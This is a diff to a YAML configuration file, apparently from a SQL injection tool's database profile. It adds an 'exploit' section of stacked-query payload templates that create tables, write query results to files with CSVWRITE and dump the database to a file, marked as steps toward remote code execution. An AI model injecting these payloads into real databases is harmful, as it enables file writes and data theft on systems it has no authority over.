@@ -98,6 +98,19 @@ resource:
     field: trim(ifnull(`${field.value}`, ''))
     concat: "|| '%7f' ||"
 
+ exploit: |
+  # [contribute] share following exploit methodologies on GitHub to improve the app :
+  # - read and write files
+  # - UDF creation
+  # - RCE
+    
+  rce:
+   createTable: |
+    ; create table %s (c varchar(255))
+    ; insert into %s (c) values ('%s')
+   callCsvWrite: ; call csvwrite('%s', 'select * from %s')
+   scriptSimple: ; script simple to '%s' table %s
+
 strategy:
  configuration:
   slidingWindow: |
